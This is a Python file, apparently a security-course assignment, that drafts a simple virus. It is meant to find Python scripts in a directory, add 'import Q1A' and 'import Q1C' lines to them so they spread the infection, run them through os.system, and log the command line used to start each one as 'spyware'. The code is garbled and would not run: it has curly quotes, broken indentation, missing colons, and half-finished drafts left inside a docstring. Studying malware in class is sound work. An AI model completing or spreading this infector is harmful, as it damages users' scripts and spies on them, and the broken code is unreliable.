#Q1C.py
#paste everything here, change from A/B to C


import os
import sys
"""import Q1A
import Q1B"""

#Q1B
searchstring = ‘if __name__ == “__main__”’ #is it a python file?


filetosearch = input(“Searching for file called: “) #prompt in command line

with open(filetosearch, ‘r’) as file:
	contents = open(__file__,’r’)
	if (searchstring in contents) and (‘Q1A.py’ not in contents): #is it a python file and does it contain virus?
		with open(filetosearch, ‘a’) as file:
			"""rewrite filetosearch so that it will... append to the end 
			of Q1Bout.py a line containing the entire comamand line used to invoke it"""
			
			#run the file (via terminal) if name == main
			os.system(f'python3 {filetosearch}')

			#append command to Q1Bout.txt
				with open(‘Q1Cout.txt’, ‘w’) as dest:
					dest.write(‘ ‘.join(sys.argv)) 

"""modifying all .py scripts in the directory in which it runs, by adding the same spyware functionality (above) and infection functionality"""
#"infect": alter original script so when it is run, it also runs the spyware code and is capable of appending (import Q1A) (and Q1C?)

			#infect: add import Q1A and Q1C to the top of the file
			file.write(‘import Q1A’)
			file.write(‘\n’)
			file.write(‘import Q1C’)


				
"""

dir_path = os.path.dirname(os.path.realpath(__file__))
proofofpy = ‘if __name__ == “__main__”’

with open(‘Q1Aout.txt’, ‘w’) as dest: 
	for file in files #iterate through directory, choose files
	contents = open(__file__,’r’)
		if (proofofpy in contents) and (‘Q1A.py’ not in contents):
			with open(filetosearch, ‘a’) as file:
				file.write(‘import Q1A’) #infect file
				file.write(‘/n’)

#2. whenever the infected script is run, print the entire command line used to invoke it

with open(‘Q1Cout.txt’, ‘w’) as file:
	file.write(‘ ‘.join(sys.argv)

# create a file
with open(‘Q1Aout.txt’, ‘w’) as dest: 
	for root, dirs, files in os.walk(dir_path):
		for file in files #iterate through directory, choose files
			if file.endswith(‘.py’) #is it a python file?
				# add to new file 
					dest.write(file) #record file
					dest.txt.write(‘/n’) #open newline for next file
"""